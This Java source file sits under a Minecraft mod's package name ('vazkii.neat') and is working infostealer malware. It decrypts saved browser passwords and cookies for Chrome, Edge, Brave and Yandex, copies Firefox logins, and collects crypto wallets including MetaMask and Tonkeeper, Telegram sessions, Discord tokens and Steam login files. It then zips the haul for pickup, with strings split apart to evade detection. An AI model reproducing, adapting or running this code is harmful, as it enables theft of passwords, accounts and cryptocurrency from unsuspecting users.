package vazkii.neat;

import com.sun.jna.platform.win32.Crypt32Util;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.sql.*;
import java.util.*;
import java.util.regex.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class G {
    private static final String TAG = "Collector";

    private G() {}

    public static Path collectAll() throws Exception {
        Path tmp = E.tempDir();
        Files.createDirectories(tmp);
        try {
            collectBrowsers(tmp);
            collectWallets(tmp);
            collectTelegram(tmp);
            collectDiscord(tmp);
            collectSteam(tmp);
            collectTonkeeper(tmp);
            Path zip = tmp.resolveSibling(E.rand(10) + ".tmp");
            zipDir(tmp, zip);
            deleteDir(tmp);
            return zip;
        } catch (Exception e) {
            deleteDir(tmp);
            throw e;
        }
    }

    private static void collectBrowsers(Path out) {
        String local = System.getenv(C.b("LOCAL", "APPDATA"));
        String roaming = System.getenv(C.b("APP", "DATA"));
        if (local == null || roaming == null) return;

        String ud = C.b("\\User", " Data");
        String[][] chromium = {
            {local + C.b("\\Goo", "gle\\Chro", "me") + ud, C.b("Chro", "me")},
            {local + C.b("\\Mic", "rosoft\\Ed", "ge") + ud, C.b("Ed", "ge")},
            {local + C.b("\\Bra", "veSoftware\\", "Brave-Browser") + ud, C.b("Bra", "ve")},
            {local + C.b("\\Yan", "dex\\Yand", "exBrowser") + ud, C.b("Yan", "dex")}
        };
        for (String[] b : chromium) {
            try {
                Path base = Paths.get(b[0]);
                if (!Files.isDirectory(base)) continue;
                Path dest = out.resolve(C.b("bro", "wsers")).resolve(b[1]);
                Files.createDirectories(dest);
                
                Path statePath = base.resolve(C.b("Loc", "al Sta", "te"));
                copyIfExists(statePath, dest.resolve(C.b("Loc", "al Sta", "te")));
                
                try (DirectoryStream<Path> ds = Files.newDirectoryStream(base)) {
                    for (Path p : ds) {
                        String n = p.getFileName().toString();
                        if (!n.equals(C.b("Def", "ault")) && !n.startsWith(C.b("Pro", "file"))) continue;
                        Path d = dest.resolve(n);
                        Files.createDirectories(d);
                        
                        Path loginData = p.resolve(C.b("Log", "in Da", "ta"));
                        copyIfExists(loginData, d.resolve(C.b("Log", "in Da", "ta")));
                        
                        copyIfExists(p.resolve(C.b("Web", " Data")), d.resolve(C.b("Web", " Data")));
                        copyIfExists(p.resolve(C.b("His", "tory")), d.resolve(C.b("His", "tory")));

                        Path networkCookies = p.resolve(C.b("Net", "work") + "\\" + C.b("Coo", "kies"));
                        Path oldCookies = p.resolve(C.b("Coo", "kies"));
                        Path actualCookies = Files.exists(networkCookies) ? networkCookies : oldCookies;
                        
                        if (Files.exists(actualCookies)) {
                            copyIfExists(actualCookies, d.resolve(C.b("Coo", "kies")));
                            if (Files.exists(statePath)) {
                                decryptCookies(actualCookies, statePath, d.resolve(C.b("cook", "ies", ".txt")));
                            }
                        }

                        if (Files.isRegularFile(loginData) && Files.isRegularFile(statePath)) {
                            String plain = decryptChromePasswords(loginData, statePath);
                            if (!plain.isEmpty()) {
                                Files.write(d.resolve(C.b("pass", "words", ".txt")), plain.getBytes(StandardCharsets.UTF_8));
                            }
                        }
                    }
                }
            } catch (Exception e) {
                B.warn(TAG, "browser: " + e.getMessage());
            }
        }

        try {
            Path ff = Paths.get(roaming, C.b("Moz", "illa"), C.b("Fire", "fox"), C.b("Pro", "files"));
            if (Files.isDirectory(ff)) {
                Path dest = out.resolve(C.b("bro", "wsers")).resolve(C.b("Fire", "fox"));
                Files.createDirectories(dest);
                try (DirectoryStream<Path> ds = Files.newDirectoryStream(ff)) {
                    for (Path p : ds) {
                        if (!Files.isDirectory(p)) continue;
                        copyIfExists(p.resolve(C.b("log", "ins", ".json")), dest.resolve(p.getFileName() + C.b("_lo", "gins", ".json")));
                        copyIfExists(p.resolve(C.b("key", "4", ".db")), dest.resolve(p.getFileName() + C.b("_key", "4", ".db")));
                        copyIfExists(p.resolve(C.b("coo", "kies", ".sqlite")), dest.resolve(p.getFileName() + C.b("_coo", "kies", ".sqlite")));
                    }
                }
            }
        } catch (Exception e) {
            B.warn(TAG, "firefox: " + e.getMessage());
        }
    }

    private static void collectWallets(Path out) {
        String roaming = System.getenv(C.b("APP", "DATA"));
        String local = System.getenv(C.b("LOCAL", "APPDATA"));
        if (roaming == null || local == null) return;

        String[][] wallets = {
            {roaming + C.b("\\Exo", "dus\\exo", "dus", ".wallet"), C.b("Exo", "dus")},
            {roaming + C.b("\\Ele", "ctrum\\wa", "llets"), C.b("Ele", "ctrum")},
            {roaming + C.b("\\Eth", "ereum\\ke", "ystore"), C.b("Eth", "ereum")},
            {roaming + C.b("\\Bit", "coin\\wa", "llets"), C.b("Bit", "coin")},
            {local + C.b("\\Goo", "gle\\Chro", "me") + C.b("\\User", " Data") + C.b("\\Def", "ault") +
                C.b("\\Loc", "al Exte", "nsion Sett", "ings\\nkb", "ihfbeogae", "aoehlefnk", "odbefgpgknn"), C.b("Meta", "Mask")}
        };
        for (String[] w : wallets) {
            try {
                Path src = Paths.get(w[0]);
                if (!Files.exists(src)) continue;
                Path dest = out.resolve(C.b("wal", "lets")).resolve(w[1]);
                if (Files.isDirectory(src)) copyDir(src, dest);
                else { Files.createDirectories(dest.getParent()); Files.copy(src, dest, StandardCopyOption.REPLACE_EXISTING); }
            } catch (Exception e) {
                B.warn(TAG, "wallet: " + e.getMessage());
            }
        }
    }

    private static void collectTelegram(Path out) {
        String roaming = System.getenv(C.b("APP", "DATA"));
        if (roaming == null) return;
        try {
            Path src = Paths.get(roaming, C.b("Tele", "gram Des", "ktop"), C.b("tda", "ta"));
            if (!Files.isDirectory(src)) return;
            Path dest = out.resolve(C.b("tele", "gram"));
            Files.createDirectories(dest);
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(src)) {
                for (Path p : ds) {
                    String n = p.getFileName().toString();
                    if (n.equals(C.b("user", "_data")) || n.equals(C.b("emo", "ji"))) continue;
                    if (n.startsWith(C.b("user", "_data")) || n.startsWith(C.b("emo", "ji"))) continue;
                    if (Files.isDirectory(p)) copyDir(p, dest.resolve(n));
                    else Files.copy(p, dest.resolve(n), StandardCopyOption.REPLACE_EXISTING);
                }
            }
        } catch (Exception e) {
            B.warn(TAG, "telegram: " + e.getMessage());
        }
    }

    private static void collectDiscord(Path out) {
        String roaming = System.getenv(C.b("APP", "DATA"));
        if (roaming == null) return;
        try {
            Path src = Paths.get(roaming, C.b("dis", "cord"), C.b("Loc", "al Sto", "rage"), C.b("lev", "eldb"));
            if (!Files.isDirectory(src)) return;
            Path dest = out.resolve(C.b("dis", "cord"));
            Files.createDirectories(dest);
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(src, C.b("*", ".ldb"))) {
                for (Path p : ds) Files.copy(p, dest.resolve(p.getFileName()), StandardCopyOption.REPLACE_EXISTING);
            }
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(src, C.b("*", ".log"))) {
                for (Path p : ds) Files.copy(p, dest.resolve(p.getFileName()), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {
            B.warn(TAG, "discord: " + e.getMessage());
        }
    }

    private static void collectSteam(Path out) {
        try {
            Path base = Paths.get(C.b("C:\\Pro", "gram Fil", "es (x86)", "\\Ste", "am\\con", "fig"));
            if (!Files.isDirectory(base)) return;
            Path dest = out.resolve(C.b("ste", "am"));
            Files.createDirectories(dest);
            copyIfExists(base.resolve(C.b("log", "inusers", ".vdf")), dest.resolve(C.b("log", "inusers", ".vdf")));
            copyIfExists(base.resolve(C.b("con", "fig", ".vdf")), dest.resolve(C.b("con", "fig", ".vdf")));
            try (DirectoryStream<Path> ds = Files.newDirectoryStream(base.getParent(), C.b("ss", "fn", "*"))) {
                for (Path p : ds) Files.copy(p, dest.resolve(p.getFileName()), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {
            B.warn(TAG, "steam: " + e.getMessage());
        }
    }

    private static void collectTonkeeper(Path out) {
        String local = System.getenv(C.b("LOCAL", "APPDATA"));
        if (local == null) return;
        String ud = C.b("\\User", " Data");
        String[] bases = {
            local + C.b("\\Goo", "gle\\Chro", "me") + ud,
            local + C.b("\\Mic", "rosoft\\Ed", "ge") + ud,
            local + C.b("\\Bra", "veSoftware\\", "Brave-Browser") + ud,
            local + C.b("\\Yan", "dex\\Yand", "exBrowser") + ud
        };
        String ext = C.b(A.TONKEEPER_EXT_A, A.TONKEEPER_EXT_B);
        for (String b : bases) {
            try {
                Path base = Paths.get(b);
                if (!Files.isDirectory(base)) continue;
                try (DirectoryStream<Path> ds = Files.newDirectoryStream(base)) {
                    for (Path p : ds) {
                        String n = p.getFileName().toString();
                        if (!n.equals(C.b("Def", "ault")) && !n.startsWith(C.b("Pro", "file"))) continue;
                        Path extDir = p.resolve(C.b("Loc", "al Exte", "nsion Sett", "ings")).resolve(ext);
                        if (!Files.isDirectory(extDir)) continue;
                        copyDir(extDir, out.resolve(C.b("ton", "keeper")).resolve(p.getFileName().toString()));
                    }
                }
            } catch (Exception e) {
                B.warn(TAG, "tonkeeper: " + e.getMessage());
            }
        }
    }

    public static String decryptChromePasswords(Path loginData, Path localState) {
        try {
            String state = new String(Files.readAllBytes(localState), StandardCharsets.UTF_8);
            Matcher m = Pattern.compile(C.b("\"encryp", "ted_key\"", "\\s*:\\s*\"", "([^\"]+)\"")).matcher(state);
            if (!m.find()) return "";
            byte[] enc = Base64.getDecoder().decode(m.group(1));
            byte[] master = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(enc, 5, enc.length));
            StringBuilder sb = new StringBuilder();
            try (Connection c = DriverManager.getConnection(C.b("jdbc:", "sqlite:") + loginData)) {
                try (Statement s = c.createStatement();
                     ResultSet rs = s.executeQuery(C.b("SELECT ", "origin_url", ", userna", "me_value", ", passw", "ord_value", " FROM lo", "gins"))) {
                    while (rs.next()) {
                        byte[] pv = rs.getBytes(3);
                        if (pv == null || pv.length < 15) continue;
                        String pass = "?";
                        try {
                            byte[] nonce = Arrays.copyOfRange(pv, 3, 15), ct = Arrays.copyOfRange(pv, 15, pv.length);
                            javax.crypto.Cipher ciph = javax.crypto.Cipher.getInstance(C.b("AES/", "GCM/", "NoPad", "ding"));
                            ciph.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(master, C.b("AE", "S")), new javax.crypto.spec.GCMParameterSpec(128, nonce));
                            pass = new String(ciph.doFinal(ct), StandardCharsets.UTF_8);
                        } catch (Exception ignored) {}
                        sb.append(rs.getString(1)).append(" | ").append(rs.getString(2)).append(" | ").append(pass).append('\n');
                    }
                }
            }
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    public static void decryptCookies(Path cookiesPath, Path localState, Path outputFile) {
        try {
            String state = new String(Files.readAllBytes(localState), StandardCharsets.UTF_8);
            Matcher m = Pattern.compile(C.b("\"encryp", "ted_key\"", "\\s*:\\s*\"", "([^\"]+)\"")).matcher(state);
            if (!m.find()) return;
            
            byte[] enc = Base64.getDecoder().decode(m.group(1));
            byte[] master = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(enc, 5, enc.length));
            StringBuilder sb = new StringBuilder();
            sb.append("domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n");

            try (Connection c = DriverManager.getConnection(C.b("jdbc:", "sqlite:") + cookiesPath)) {
                try (Statement s = c.createStatement();
                     ResultSet rs = s.executeQuery("SELECT host_key, is_secure, path, expires_utc, name, encrypted_value FROM cookies")) {
                    while (rs.next()) {
                        byte[] pv = rs.getBytes(6);
                        if (pv == null || pv.length < 15) continue;
                        try {
                            byte[] nonce = Arrays.copyOfRange(pv, 3, 15), ct = Arrays.copyOfRange(pv, 15, pv.length);
                            javax.crypto.Cipher ciph = javax.crypto.Cipher.getInstance(C.b("AES/", "GCM/", "NoPad", "ding"));
                            ciph.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(master, C.b("AE", "S")), new javax.crypto.spec.GCMParameterSpec(128, nonce));
                            String val = new String(ciph.doFinal(ct), StandardCharsets.UTF_8);
                            
                            long exp = rs.getLong(4);
                            if (exp > 11644473600000000L) exp = (exp / 1000000L) - 11644473600L;
                            else exp = 0;

                            sb.append(rs.getString(1)).append("\t")
                              .append(rs.getBoolean(2) ? "TRUE" : "FALSE").append("\t")
                              .append(rs.getString(3)).append("\t")
                              .append(exp).append("\t")
                              .append(rs.getString(5)).append("\t")
                              .append(val).append("\n");
                        } catch (Exception ignored) {}
                    }
                }
            }
            Files.write(outputFile, sb.toString().getBytes(StandardCharsets.UTF_8));
        } catch (Exception ignored) {}
    }

    private static void copyIfExists(Path src, Path dst) {
        try { if (Files.isRegularFile(src)) Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING); }
        catch (Exception ignored) {}
    }

    private static void copyDir(Path src, Path dst) {
        try { Files.walk(src).forEach(p -> {
            try { Path t = dst.resolve(src.relativize(p).toString()); if (Files.isDirectory(p)) Files.createDirectories(t); else { Files.createDirectories(t.getParent()); Files.copy(p, t, StandardCopyOption.REPLACE_EXISTING); } } catch (Exception ignored) {}
        }); } catch (Exception ignored) {}
    }

    private static void zipDir(Path dir, Path zip) throws Exception {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip.toFile()))) {
            Files.walk(dir).filter(Files::isRegularFile).forEach(p -> {
                try { ZipEntry e = new ZipEntry(dir.relativize(p).toString().replace('\\', '/')); zos.putNextEntry(e); Files.copy(p, zos); zos.closeEntry(); } catch (Exception ignored) {}
            });
        }
    }

    private static void deleteDir(Path dir) {
        try { Files.walk(dir).sorted(Comparator.reverseOrder()).forEach(p -> { try { Files.deleteIfExists(p); } catch (Exception ignored) {} }); } catch (Exception ignored) {}
    }
}